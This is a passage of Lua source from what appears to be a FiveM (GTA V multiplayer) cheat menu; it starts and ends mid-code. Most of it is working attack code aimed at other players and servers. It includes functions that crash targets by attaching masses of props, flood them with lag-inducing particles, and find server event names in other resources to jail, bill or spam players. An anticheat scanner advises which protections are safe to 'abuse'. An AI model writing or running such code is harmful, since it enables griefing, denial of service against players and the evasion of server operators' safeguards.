            local fu = true;
            while c.var.checkbox.Hulk do
                a.Wait(0)
                b.SetSuperJumpThisFrame(b.PlayerId())
                if b.IsDisabledControlJustPressed(0, c.Keys['E']) then
                    if vehicle == 0 then
                        local fv = false;
                        for k in c.func.EnumerateVehicles() do
                            if b.GetDistanceBetweenCoords(b.GetEntityCoords(Q),
                                                          b.GetEntityCoords(k,
                                                                            true),
                                                          true) < 5 then
                                if not fv then
                                    vehicle = k;
                                    fv = true;
                                    b.AttachEntityToEntity(vehicle, Q, 0, 0.0,
                                                           0.0, 1.35, 0.0, 0.0,
                                                           90.0, false, false,
                                                           false, false, 2, true)
                                    b.SetEntityAlpha(vehicle, 153, 1)
                                end
                            end
                        end
                    else
                        b.DetachEntity(vehicle, true, true)
                        local fp = b.GetGameplayCamRot(2)
                        local fq = 10;
                        local fr = -(c._math.sin(c._math.rad(fp.z)) * fq * 10)
                        local fs = c._math.cos(c._math.rad(fp.z)) * fq * 10;
                        local ft = fq * fp.x * 0.2;
                        b.ApplyForceToEntity(vehicle, 3, fr, fs, ft, 0, 0, 0,
                                             true, false, true, true, true, true)
                        b.ResetEntityAlpha(vehicle)
                        vehicle = 0
                    end
                end
            end
        end,
        C_Spectate = function()
            local ew = {
                selfped = b.PlayerPedId(),
                ped = c.var.data.selectedPlayer.ped,
                cam = nil,
                coords = nil,
                distance = -3,
                polarangledeg = 0,
                azimuthangledeg = 90
            }
            local function fw(fx, cF, fy, fz)
                local fA = fy * c._math.pi / 180.0;
                local fB = fz * c._math.pi / 180.0;
                local fC = {
                    x = fx.x + cF * c._math.sin(fB) * c._math.cos(fA),
                    y = fx.y - cF * c._math.sin(fB) * c._math.sin(fA),
                    z = fx.z - cF * c._math.cos(fB)
                }
                return fC
            end
            if not b.DoesCamExist(ew.cam) then
                ew.cam = b.CreateCam('DEFAULT_SCRIPTED_CAMERA', 1)
                ew.coords = b.GetEntityCoords(ew.ped)
                b.SetCamCoord(ew.cam, ew.coords.x, ew.coords.y,
                              ew.coords.z + 0.5)
                b.SetCamActive(ew.cam, true)
                b.RenderScriptCams(true, false, 0, true, true)
            end
            while c.var.checkbox.Spectate do
                ew.ped = b.GetPlayerPed(c.var.data.selectedPlayer.lid)
                b.DisableControlAction(0, c.Keys['TAB'], true)
                a.Wait(0)
                ew.coords = b.GetEntityCoords(ew.ped)
                local fD;
                b.FreezeEntityPosition(ew.selfped, true)
                b.SetFocusPosAndVel(ew.coords, 0, 0, 0)
                ew.polarangledeg = ew.polarangledeg +
                                       b.GetDisabledControlNormal(0, 1) * 10;
                ew.azimuthangledeg = ew.azimuthangledeg +
                                         b.GetDisabledControlNormal(0, 2) * 10;
                if ew.polarangledeg > 360 then
                    ew.polarangledeg = 0
                end
                if ew.azimuthangledeg > 360 then
                    ew.azimuthangledeg = 0
                end
                local fE = fw(ew.coords, ew.distance, ew.polarangledeg,
                              ew.azimuthangledeg)
                b.SetCamCoord(ew.cam, fE.x, fE.y, fE.z)
                b.PointCamAtEntity(ew.cam, ew.ped)
            end
            b.SetCamActive(ew.cam, false)
            b.RenderScriptCams(false, false, 0, true, true)
            b.DestroyCam(ew.cam, true)
            b.FreezeEntityPosition(ew.selfped, false)
            for ev = 1, 120, 1 do
                a.Wait(0)
                b.SetFocusEntity(ew.selfped)
            end
        end,
        StealOutfit = function(Q)
            local fF = b.PlayerPedId()
            b.SetPedPropIndex(fF, 0, b.GetPedPropIndex(Q, 0),
                              b.GetPedPropTextureIndex(Q, 0), 1)
            b.SetPedPropIndex(fF, 1, b.GetPedPropIndex(Q, 1),
                              b.GetPedPropTextureIndex(Q, 1), 1)
            b.SetPedPropIndex(fF, 2, b.GetPedPropIndex(Q, 2),
                              b.GetPedPropTextureIndex(Q, 2), 1)
            b.SetPedPropIndex(fF, 6, b.GetPedPropIndex(Q, 6),
                              b.GetPedPropTextureIndex(Q, 6), 1)
            b.SetPedPropIndex(fF, 7, b.GetPedPropIndex(Q, 7),
                              b.GetPedPropTextureIndex(Q, 7), 1)
            for ev = 0, 11 do
                b.SetPedComponentVariation(fF, ev,
                                           b.GetPedDrawableVariation(Q, ev),
                                           b.GetPedTextureVariation(Q, ev),
                                           b.GetPedPaletteVariation(Q, ev))
            end
        end,
        LoadModel = function(cb)
            if b.IsModelInCdimage(cb) and b.IsModelValid(cb) then
                b.RequestModel(cb)
                while not b.HasModelLoaded(cb) do
                    a.Wait(50)
                    b.RequestModel(cb)
                end
                return true
            else
                c.fram.func.Notify('error', 'Invalid model')
                return false
            end
        end,
        B_Crash = function(fG)
            local fH = {
                'des_floor_root', 'prop_container_03_ld', 'prop_ld_contain_dl',
                'stt_prop_stunt_bblock_huge_01', 'stt_prop_stunt_tube_l',
                'stt_prop_stunt_track_cutout', 'stt_prop_stunt_track_dwshort',
                'stt_prop_stunt_tube_crn', 'prop_pylon_04',
                'ch2_04_props_combo27_11_lod', 'ch2_04_v02', 'bh1_08_bld2_lod',
                'sm_18_build7_fire_exit'
            }
            a.CreateThread(function()
                local Q = b.GetPlayerPed(fG)
                for k, eB in c._ipairs(fH) do
                    a.Wait(250)
                    local n = b.GetHashKey(eB)
                    c.func.LoadModel(n)
                    for ev = 1, 6 do
                        local fI = b.CreateObject(n, 0, 0, 0, true, true, true)
                        b.AttachEntityToEntity(fI, Q, b.GetPedBoneIndex(Q, 0),
                                               0, 0, 0.0, 0.0, 0.0, true, true,
                                               false, true, 1, true)
                        b.SetEntityCollision(fI, true, true)
                        b.SetEntityHasGravity(fI, true)
                    end
                end
            end)
        end,
        B_CagePlayer = function(dc)
            local Q = b.GetPlayerPed(dc)
            a.CreateThread(function()
                local n = b.GetHashKey('hei_prop_heist_apecrate')
                local fJ = b.GetEntityCoords(Q)
                c.func.LoadModel(n)
                local fK = b.CreateObject(n, fJ.x, fJ.y, fJ.z - 0.5, true, true,
                                          true)
                b.SetEntityCollision(fK, true, true)
            end)
        end,
        B_StripPlayer = function(dc)
            a.CreateThread(function()
                local Q = b.GetPlayerPed(dc)
                local c8 = b.GetEntityCoords(Q)
                local heading = b.GetEntityHeading(Q)
                local fL = {
                    {1.0, 1.0, 180.0}, {-1.0, -1.0, 0.0}, {1.0, -1.0, 270.0},
                    {-1.0, 1.0, 90.0}
                }
                local n = b.GetHashKey('csb_stripper_01')
                c.func.LoadModel(n)
                for k, eB in c._ipairs(fL) do
                    local fM = b.CreatePed(5, n, c8, heading + eB[3], true,
                                           false)
                    a.Wait(50)
                    b.AttachEntityToEntity(fM, Q, 0, eB[1], eB[2], 0, 0.0, 0.0,
                                           0.0, false, false, false, true, 2,
                                           false)
                    c.func.RunAnimation(fM, c.var.data.AnimationsList.PEGI18
                                            .info[9].type, c.var.data
                                            .AnimationsList.PEGI18.info[9].data)
                end
            end)
        end,
        ParticlesOnCoords = function(f4, bj, c8, z, fN)
            a.CreateThread(function()
                b.RequestNamedPtfxAsset(f4)
                while not b.HasNamedPtfxAssetLoaded(f4) do
                    b.RequestNamedPtfxAsset(f4)
                    a.Wait(5)
                end
                b.UseParticleFxAssetNextCall(f4)
                if fN then
                    b.StartNetworkedParticleFxNonLoopedAtCoord(bj, c8.x, c8.y,
                                                               c8.z, 0.0, 0.0,
                                                               0.0, z or 100.0,
                                                               0.0, 0.0, 0.0)
                else
                    b.StartParticleFxNonLoopedAtCoord(bj, c8.x, c8.y, c8.z, 0.0,
                                                      0.0, 0.0, z or 100.0, 0.0,
                                                      0.0, 0.0)
                end
            end)
        end,
        B_FlashBangPlayer = function(dc)
            a.CreateThread(function()
                local Q = b.GetPlayerPed(dc)
                for ev = 1, 500 do
                    a.Wait(10)
                    c.func.ParticlesOnCoords('core', 'ent_anim_paparazzi_flash',
                                             b.GetEntityCoords(Q), 75.0, true)
                end
            end)
        end,
        B_InivisbleBus = function(dc)
            a.CreateThread(function()
                local Q = b.GetPlayerPed(dc)
                local c8 = b.GetEntityCoords(Q)
                c8 = c._vector3(c8.x + b.GetEntityForwardX(Q) * 15,
                                c8.y + b.GetEntityForwardY(Q) * 15, c8.z)
                local n = b.GetHashKey('tourbus')
                c.func.LoadModel(n)
                local vehicle = b.CreateVehicle(n, c8, c8, c8.z,
                                                (b.GetEntityHeading(Q) <= 360 and
                                                    b.GetEntityHeading(Q) or 0.0) +
                                                    270.0, true, false)
                b.SetEntityVisible(vehicle, false, false)
                a.Wait(2000)
                b.DeleteEntity(vehicle)
            end)
        end,
        GetResources = function()
            local fO = {}
            for ev = 0, b.GetNumResources() do
                fO[ev] = b.GetResourceByFindIndex(ev)
            end
            return fO
        end,
        GetResourceState = function(fP)
            if b.GetResourceState(fP) == 'started' then return true end
            return false
        end,
        split = function(h, fQ)
            local l = {}
            local e = 1;
            local fR, fS = c._string.find(h, fQ, e, true)
            while fR do
                if fR ~= 1 then
                    c._table.insert(l, c._string.sub(h, e, fR - 1))
                end
                e = fS + 1;
                fR, fS = c._string.find(h, fQ, e, true)
            end
            if e <= #h then c._table.insert(l, c._string.sub(h, e)) end
            return l
        end,
        DynamicTriggers = function()
            local fT = 0;
            c.var.tr = {}
            local function fU(eB)
                for eR, fV in c._pairs(eB.resources) do
                    for fW, fP in c._pairs(c.func.GetResources()) do
                        if c._string.find(c._string.lower(fP), fV) and
                            c.func.GetResourceState(fP) then
                            for fX, fY in c._pairs(eB.files) do
                                local fZ = b.LoadResourceFile(fP, fY)
                                if fZ then
                                    if fZ and c._string.len(fZ) > 0 and fZ ~= '' and
                                        fZ ~= ' ' then
                                        fZ = c.func.split(fZ, '\n')
                                        for f_, g0 in c._pairs(eB.patterns) do
                                            local type = c._string.sub(g0, 1, 6)
                                            if type == 'above$' or type ==
                                                'under$' then
                                                g0 =
                                                    c._string.sub(g0, 7,
                                                                  c._string
                                                                      .len(g0))
                                                local fC =
                                                    type == 'above$' and -1 or 1;
                                                for g1, g2 in c._ipairs(fZ) do
                                                    if c._string.find(g2, g0) then
                                                        local g3 = g1 + fC;
                                                        local g4 = fZ[g3]
                                                        if not c._string.find(
                                                            g4,
                                                            eB.func .. '%b()') then
                                                            repeat
                                                                a.Wait(0)
                                                                g3 = g3 + fC;
                                                                g4 = fZ[g3]
                                                            until not g4 or
                                                                c._string
                                                                    .find(g4,
                                                                          eB.func ..
                                                                              '%b()')
                                                        end
                                                        if g4 then
                                                            if eB.payload and
                                                                not c._string
                                                                    .find(g4,
                                                                          eB.payload) then
                                                                return
                                                            end
                                                            local g5, g6 =
                                                                c._string.find(
                                                                    g4,
                                                                    eB.func ..
                                                                        '%b()')
                                                            if g5 and g6 then
                                                                g4 = c._string
                                                                         .sub(
                                                                         g4, g5,
                                                                         g6)
                                                                g4 = c._string
                                                                         .gsub(
                                                                         g4,
                                                                         eB.func,
                                                                         '')
                                                                if c._string
                                                                    .find(g4,
                                                                          '\',') or
                                                                    c._string
                                                                        .find(
                                                                        g4, '",') then
                                                                    g5, g6 =
                                                                        c._string
                                                                            .find(
                                                                            g4,
                                                                            '\',') or
                                                                            c._string
                                                                                .find(
                                                                                g4,
                                                                                '",')
                                                                    g4 =
                                                                        c._string
                                                                            .sub(
                                                                            g4,
                                                                            1,
                                                                            g5 +
                                                                                1)
                                                                end
                                                                g4 = c._string
                                                                         .sub(
                                                                         g4, 3,
                                                                         c._string
                                                                             .len(
                                                                             g4) -
                                                                             2)
                                                                fT = fT + 1;
                                                                c.var.tr[eB.store] =
                                                                    g4;
                                                                if eB.addto then
                                                                    for g7, g8 in
                                                                        c._pairs(
                                                                            eB.addto) do
                                                                        c._table
                                                                            .insert(
                                                                            c.fram
                                                                                .menus[g7]
                                                                                .options,
                                                                            g8)
                                                                    end
                                                                end
                                                                return
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            a.CreateThread(function()
                a.Wait(2500)
                for k, eB in c._ipairs(c.var.data.Triggers) do
                    if c._type(eB.files) ~= 'table' then
                        eB.files = {eB.files}
                    end
                    if c._type(eB.patterns) ~= 'table' then
                        eB.patterns = {eB.patterns}
                    end
                    if c._type(eB.resources) ~= 'table' then
                        eB.resources = {eB.resources}
                        for g9, eH in c._pairs(eB.resources) do
                            eH = c._string.lower(eH)
                        end
                    end
                    if not eB.func then
                        eB.func = 'TriggerServerEvent'
                    end
                    fU(eB)
                end
            end)
        end,
        TriggerCustomEvent = function(ga, gb, ...)
            local gc = c._msgpack.pack({...})
            if ga then
                b.TriggerServerEventInternal(gb, gc, c._string.len(gc))
            else
                b.TriggerEventInternal(gb, gc, c._string.len(gc))
            end
        end,
        KeyboardInput = function(gd, ge, ep, gf)
            local l;
            b.AddTextEntry('FMMC_KEY_TIP1', gd .. ':')
            b.DisplayOnscreenKeyboard(2, 'FMMC_KEY_TIP1', '', ge or '', '', '',
                                      '', ep or 255)
            while true do
                a.Wait(0)
                b.DisableAllControlActions(0)
                local gg = b.UpdateOnscreenKeyboard()
                if gg == 2 then
                    break
                elseif gg == 1 then
                    l = b.GetOnscreenKeyboardResult()
                    break
                end
            end
            return gf and c._tonumber(l) or l
        end,
        B_JailPlayers = function(dc)
            if c.var.tr['esx-qalle-jail:JailPlayer'] then
                local gh = c.func.KeyboardInput('Jail Reason',
                                                'Cuz Absolute is p100', 255,
                                                false)
                local time = c.func.KeyboardInput('Jail Time (-1) for random',
                                                  '120', 7, true)
                if not time or time == 0 or gh == '' then return end
                a.CreateThread(function()
                    for k, eB in c._pairs(dc) do
                        a.Wait(36)
                        c.func.TriggerCustomEvent(true,
                                                  c.var.tr['esx-qalle-jail:JailPlayer'],
                                                  b.GetPlayerServerId(eB),
                                                  time == -1 and
                                                      c._math.random(10, 900) or
                                                      time, gh)
                    end
                end)
            end
        end,
        B_MessagePlayers = function(dc)
            if c.var.tr['esx_policejob:message'] then
                local eO = c.func.KeyboardInput('Message',
                                                'Absolute just keked you', 255,
                                                false)
                local time = c.func.KeyboardInput('Times', '6', 7, true)
                if not time or time == 0 or eO == '' then return end
                a.CreateThread(function()
                    for k, eB in c._pairs(dc) do
                        a.Wait(36)
                        for ev = 1, time, 1 do
                            a.Wait(30)
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['esx_policejob:message'],
                                                      b.GetPlayerServerId(eB),
                                                      eO)
                        end
                    end
                end)
            end
        end,
        B_BillPlayers = function(dc)
            if c.var.tr['esx_billing:sendBill'] then
                local eO = c.func.KeyboardInput('Message',
                                                'Absolute just keked you', 255,
                                                false)
                local time = c.func.KeyboardInput('Times', '6', 7, true)
                local gi = c.func.KeyboardInput('Money amount (-1 for random)',
                                                '100', 11, true)
                if not time or time == 0 or eO == '' then return end
                a.CreateThread(function()
                    for k, eB in c._pairs(dc) do
                        a.Wait(36)
                        for ev = 1, time, 1 do
                            a.Wait(30)
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['esx_billing:sendBill'],
                                                      b.GetPlayerServerId(eB),
                                                      'society_police',
                                                      'Absolute - ' .. eO, gi ==
                                                          -1 and
                                                          c._math
                                                              .random(1,
                                                                      10000000))
                        end
                    end
                end)
            end
        end,
        B_EmotePlayers = function(gj, ew)
            if c.var.tr['dp-emotes:ServerValidEmote'] then
                if #gj == 1 and b.PlayerId() == gj[1] then return end
                a.CreateThread(function()
                    for k, eB in c._pairs(gj) do
                        a.Wait(36)
                        c.func.TriggerCustomEvent(true,
                                                  c.var.tr['dp-emotes:ServerValidEmote'],
                                                  b.GetPlayerServerId(eB),
                                                  ew[1], ew[2])
                    end
                end)
            end
        end,
        B_RamPlayers = function(gj, vehicle)
            a.CreateThread(function()
                local n = b.GetHashKey(vehicle)
                c.func.LoadModel(n)
                for k, eB in c._pairs(gj) do
                    a.Wait(60)
                    local Q = b.GetPlayerPed(eB)
                    local gk = c._math.abs(b.GetEntityForwardX(Q)) * 15;
                    local gl = c._math.abs(b.GetEntityForwardY(Q)) * 15;
                    local c8 = b.GetEntityCoords(Q)
                    local vehicle = b.CreateVehicle(n, c8.x - gk * 1.1,
                                                    c8.y - gl * 1.1, c8.z + 2.0,
                                                    b.GetEntityHeading(Q), true,
                                                    false)
                    b.ApplyForceToEntity(vehicle, 3, gk * 25, gl * 25, 0.0, 0.0,
                                         0.0, 0.0, 0, false, true, true, false,
                                         true)
                    a.Wait(6500)
                    b.DeleteEntity(vehicle)
                end
            end)
        end,
        CreateAndAttachPropToEntity = function(_, gm, b4, gn, go, gp)
            a.CreateThread(function()
                local n = b.GetHashKey(gm)
                c.func.LoadModel(n)
                local fJ = b.GetEntityCoords(_)
                local gm = b.CreateObject(n, fJ.x, fJ.y, fJ.z - 0.5, true, true,
                                          true)
                b.AttachEntityToEntity(gm, _, b.GetPedBoneIndex(_, 0), 0, 0, 0,
                                       gn or 0.0, go or 0.0, gp or 0.0, false,
                                       false, b4 or false, true, 2, true)
            end)
        end,
        B_FlagPlayers = function(gj, cL)
            a.CreateThread(function()
                for k, eB in c._pairs(gj) do
                    a.Wait(36)
                    c.func.CreateAndAttachPropToEntity(b.GetPlayerPed(eB), cL,
                                                       true)
                end
            end)
        end,
        OnlinePlayersParticles = {
            function(gj)
                a.CreateThread(function()
                    local gq = c.var.data.LagParticles[c._math.random(1, #c.var
                                                                          .data
                                                                          .LagParticles)]
                    for k, eB in c._pairs(gj) do
                        local Q = b.GetPlayerPed(eB)
                        for ev = 1, 1000 do
                            a.Wait(10)
                            local c8 = b.GetEntityCoords(Q)
                            c.func.ParticlesOnCoords(gq[1], gq[2], c8, 100.0,
                                                     true)
                            c.func.ParticlesOnCoords(gq[1], gq[2], c8, 100.0,
                                                     true)
                        end
                    end
                end)
            end, function(gj)
                a.CreateThread(function()
                    for k, eB in c._pairs(gj) do
                        local Q = b.GetPlayerPed(eB)
                        for ev = 1, 1000 do
                            a.Wait(10)
                            local c8 = b.GetEntityCoords(Q)
                            local gq = c.var.data.LagParticles[c._math.random(1,
                                                                              #c.var
                                                                                  .data
                                                                                  .LagParticles)]
                            c.func.ParticlesOnCoords(gq[1], gq[2], c8, 100.0,
                                                     true)
                            c.func.ParticlesOnCoords(gq[1], gq[2], c8, 100.0,
                                                     true)
                        end
                    end
                end)
            end
        },
        OnlinePlayersBasics = {
            function()
                b.SetPedCoordsKeepVehicle(b.PlayerPedId(), b.GetEntityCoords(
                                              c.var.data.selectedPlayer.ped))
            end,
            function()
                c.func.StealOutfit(c.var.data.selectedPlayer.ped)
            end,
            function()
                b.ClonePed(c.var.data.selectedPlayer.ped, 1, 1, 1)
            end
        },
        OnlinePlayersWeapons = {
            function(gj)
                a.CreateThread(function()
                    for k, eB in c._pairs(gj) do
                        local Q = b.GetPlayerPed(eB)
                        for k, eB in c._pairs(c.var.data.AllWeapons) do
                            b.GiveWeaponToPed(Q, b.GetHashKey(eB), 100, true,
                                              false)
                        end
                    end
                end)
            end, function(gj)
                a.CreateThread(function()
                    for k, eB in c._pairs(gj) do
                        local Q = b.GetPlayerPed(eB)
                        local gr = b.IsDisabledControlPressed(0,
                                                              c.Keys['LEFTSHIFT']) or
                                       b.IsControlPressed(0, c.Keys['LEFTSHIFT'])
                        for k, eB in c._pairs(c.var.data.AllWeapons) do
                            if eB == 'weapon_unarmed' then
                                if gr then
                                    b.RemoveWeaponFromPed(Q, b.GetHashKey(eB))
                                end
                            else
                                b.RemoveWeaponFromPed(Q, b.GetHashKey(eB))
                            end
                        end
                    end
                end)
            end, function(gj)
                a.CreateThread(function()
                    for k, eB in c._pairs(gj) do
                        local gs = c.func.KeyboardInput('Weapon Name',
                                                        'WEAPON_', 60, false)
                        if gs then
                            local bb = c.func.KeyboardInput('Ammo amount', '15',
                                                            3, true)
                            if bb and bb > 0 then
                                b.GiveWeaponToPed(b.GetPlayerPed(eB),
                                                  b.GetHashKey(gs), bb, true,
                                                  false)
                            end
                        end
                    end
                end)
            end
        },
        AnticheatChecker = function()
            a.CreateThread(function()
                local gt = {
                    {
                        name = 'ChocoHax',
                        file = 'configs/clientconfig.lua',
                        desc = 'This is an anti rage, be careful with explosions'
                    }, {
                        name = 'LR-AC',
                        file = 'cliente.lua',
                        desc = 'DFWM paste lol, just be careful with props and explosions'
                    }, {
                        name = 'LR-AC',
                        file = 'toload.lua',
                        desc = 'DFWM paste lol, just be careful with props and explosions'
                    }, {
                        name = 'NW-AC',
                        file = 'Shareds/ToLoad.lua',
                        desc = 'Basic Anti-Injections AC, be careful with props and explosions'
                    }, {
                        name = 'ShitZilla/Gozilla',
                        file = 'xd.lua',
                        desc = 'This shit is useless, feel free to abuse most of the options'
                    }, {
                        name = 'ShitZilla/Godzilla',
                        file = 'cleanarea.lua',
                        desc = 'This shit is useless, feel free to abuse most of the options'
                    }, {
                        name = 'Screenshot-basic',
                        file = 'dist/client.js',
                        desc = 'Script to take screenshots of the user'
                    }, {
                        name = 'NoHax',
                        file = 'configs/config_cl.lua',
                        desc = 'Pasted shit, only counts explosions'
                    }, {
                        name = 'NoHax',
                        file = 'configs/config_sv.lua',
                        desc = 'Pasted shit, only counts explosions'
                    }, {
                        name = 'Venom AC/VAC',
                        file = 'client/link.lua',
                        desc = 'Be careful with vac, it counts/ban explosions/peds/vehicles'
                    }, {
                        name = 'Badger AC',
                        file = 'acloader.lua',
                        desc = 'Outdated, feel free to use the options on it'
                    }, {
                        name = 'Tigo Anticheat',
                        file = 'shared/ansicolors.lua',
                        desc = 'Outdated, feel free to use the options on it'
                    }, {
                        name = 'Tigo Anticheat',
                        file = 'client/anticheat/lynx_inject.lua',
                        desc = 'Outdated, feel free to use the options on it'
                    }
                }
                local gu = {
                    {"_ENV", "IronBrew"},
                    {"string.byte,table.insert,setmetatable", "IronBrew"},
                    {"return load%('", "XFuscator"}, {"load%(x%)", "XFuscator"},
                    {"=_G;", "Xor Modified"},
                    {"local a=load%(%(function", "XOR Basic"},
                    {
                        "This file was obfuscated using PSU Obfuscator 4.0.A",
                        "PSU Obfuscator"
                    }, {
                        "print%('\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10'%)",
                        "XOR Modified"
                    }
                }
                local gv = 0;
                for k, eB in c._ipairs(c.func.GetResources()) do
                    a.Wait(0)
                    local gw, gx, gy = b.LoadResourceFile(eB, 'client.lua'),
                                       b.LoadResourceFile(eB, 'client/main.lua'),
                                       b.LoadResourceFile(eB, 'cliente.lua')
                    for eR, gz in c._ipairs(gt) do
                        local fZ = b.LoadResourceFile(eB, gz.file)
                        if fZ and c._string.len(fZ) > 0 and
                            (fZ ~= '' and fZ ~= ' ') then
                            c.fram.menus.MiscAnticheatChecker.options[#c.fram
                                .menus.MiscAnticheatChecker.options + 1] = {
                                data = {
                                    title = eB,
                                    description = gz.name ..
                                        ' has been found in ' .. eB .. '\n' ..
                                        gz.desc
                                },
                                func = 'Button'
                            }
                            c.var.data.AnticheatsRecord[#c.var.data
                                .AnticheatsRecord + 1] = {
                                name = gz.name,
                                resource = eB .. '/' .. gz.file
                            }
                            gv = gv + 1
                        end
                    end
                    for eR, gA in c._ipairs(gu) do
                        if gw and c._string.find(gw, gA[1]) then
                            c.fram.menus.MiscAnticheatChecker.options[#c.fram
                                .menus.MiscAnticheatChecker.options + 1] = {
                                data = {
                                    title = eB,
                                    description = 'File is obfuscated with ' ..
                                        gA[2]
                                },
                                func = 'Button'
                            }
                            gv = gv + 1
                        end
                        if gx and c._string.find(gx, gA[1]) then
                            c.fram.menus.MiscAnticheatChecker.options[#c.fram
                                .menus.MiscAnticheatChecker.options + 1] = {
                                data = {
                                    title = eB,
                                    description = 'File is obfuscated with ' ..
                                        gA[2]
                                },
                                func = 'Button'
                            }
                            gv = gv + 1
                        end
                        if gy and c._string.find(gy, gA[1]) then
                            c.fram.menus.MiscAnticheatChecker.options[#c.fram
                                .menus.MiscAnticheatChecker.options + 1] = {
                                data = {
                                    title = eB,
                                    description = 'File is obfuscated with ' ..
                                        gA[2]
                                },
                                func = 'Button'
                            }
                            gv = gv + 1
                        end
                    end
                end
                if gv > 0 then
                    c.fram.func.Notify('',
                                       'Weird files found, check results (' ..
                                           gv .. ')', {255, 128, 0})
                end
            end)
        end,
        C_LoopParticles = function()
            while c.var.checkbox.particles do
                a.Wait(c.var.data.selectedParticleTime)
                c.func.ParticlesOnCoords(c.var.data.selectedParticle[1],
                                         c.var.data.selectedParticle[2],
                                         b.GetEntityCoords(b.PlayerPedId()),
                                         c.var.data.selectedParticleScale,
                                         c.var.checkbox['particles:network'])
            end
        end,
        CreateCraftMap = function(table)
            a.CreateThread(function()
                for k, ew in c._ipairs(table) do
                    a.Wait(200)
                    c.func.LoadModel(ew[1])
                    local gm = b.CreateObjectNoOffset(ew[1], ew[2], ew[3],
                                                      ew[4], true, false, false)
                    a.Wait(50)
                    b.SetEntityLodDist(gm, 696969)
                    b.SetModelAsNoLongerNeeded(gm)
                    b.FreezeEntityPosition(gm, true)
                    b.SetEntityRotation(gm, ew[5], ew[6], ew[7], 0, 1)
                end
            end)
        end,
        CreateCraftVehicle = function(vehicle, fH)
            if c._type(fH) ~= 'table' or c._type(vehicle) ~= 'table' then
                return
            end
            a.CreateThread(function()
                local n = b.GetHashKey(vehicle[1])
                if not b.IsModelValid(n) then return end
                c.func.LoadModel(n)
                local Q = b.PlayerPedId()
                local c8 = b.GetEntityCoords(Q)
                local gB = b.CreateVehicle(n, c8, 0.0, true, false)
                for ev = 1, 1001 do
                    b.SetEntityVisible(gB, not vehicle[2], 0)
                end
                if vehicle[3] then b.SetPedIntoVehicle(Q, gB, -1) end
                b.SetVehicleCustomPrimaryColour(gB, 0, 0, 0)
                b.SetVehicleCustomSecondaryColour(gB, 0, 0, 0)
                for k, eB in c._ipairs(fH) do
                    local n = b.GetHashKey(eB[1])
                    c.func.LoadModel(n)
                    local gm = b.CreateObject(n, c8, true, true, false)
                    a.Wait(10)
                    b.AttachEntityToEntity(gm, gB, 0, eB[2], eB[3], eB[4],
                                           eB[5], eB[6], eB[7], true, false,
                                           false, false, true, true)
                end
            end)
        end,
        VehicleFullTunning = function(eW)
            b.SetVehicleModKit(eW, 0)
            b.SetVehicleCustomPrimaryColour(eW, 0, 0, 0)
            b.SetVehicleCustomSecondaryColour(eW, 0, 0, 0)
            b.SetVehicleColours(eW, 54, 54)
            b.SetVehicleModColor_1(eW, 3, 0)
            b.SetVehicleExtraColours(eW, 3, 0)
            b.ToggleVehicleMod(eW, 18, 1)
            b.ToggleVehicleMod(eW, 22, 1)
            b.SetVehicleMod(eW, 16, 5, 0)
            b.SetVehicleMod(eW, 12, 2, 0)
            b.SetVehicleMod(eW, 11, 3, 0)
            b.SetVehicleMod(eW, 14, 14, 0)
            b.SetVehicleMod(eW, 15, 3, 0)
            b.SetVehicleMod(eW, 13, 2, 0)
            b.SetVehicleWindowTint(eW, 5)
            b.SetVehicleWheelType(eW, 0)
            b.SetVehicleMod(eW, 0, 1, 0)
            b.SetVehicleMod(eW, 1, 1, 0)
            b.SetVehicleMod(eW, 2, 1, 0)
            b.SetVehicleMod(eW, 3, 1, 0)
            b.SetVehicleMod(eW, 4, 1, 0)
            b.SetVehicleMod(eW, 5, 1, 0)
            b.SetVehicleMod(eW, 6, 1, 0)
            b.SetVehicleMod(eW, 7, 1, 0)
            b.SetVehicleMod(eW, 8, 1, 0)
            b.SetVehicleMod(eW, 9, 1, 0)
            b.SetVehicleMod(eW, 10, 1, 0)
            b.IsVehicleNeonLightEnabled(eW, 1)
            b.SetVehicleNeonLightEnabled(eW, 0, 1)
            b.SetVehicleNeonLightEnabled(eW, 1, 1)
            b.SetVehicleNeonLightEnabled(eW, 2, 1)
            b.SetVehicleNeonLightEnabled(eW, 3, 1)
            b.SetVehicleNeonLightEnabled(eW, 4, 1)
            b.SetVehicleNeonLightEnabled(eW, 5, 1)
            b.SetVehicleNeonLightEnabled(eW, 6, 1)
            b.SetVehicleNeonLightEnabled(eW, 7, 1)
            b.SetVehicleNeonLightsColour(eW, 10, 10, 10)
            b.SetVehicleModKit(eW, 0)
            b.ToggleVehicleMod(eW, 20, 1)
            b.SetVehicleModKit(eW, 0)
            b.SetVehicleTyreSmokeColor(eW, 0, 255, 255)
            b.SetVehicleModKit(vehicle, 0)
            b.SetVehicleMod(vehicle, 11, b.GetNumVehicleMods(vehicle, 11) - 1,
                            false)
            b.SetVehicleMod(vehicle, 12, b.GetNumVehicleMods(vehicle, 12) - 1,
                            false)
            b.SetVehicleMod(vehicle, 13, b.GetNumVehicleMods(vehicle, 13) - 1,
                            false)
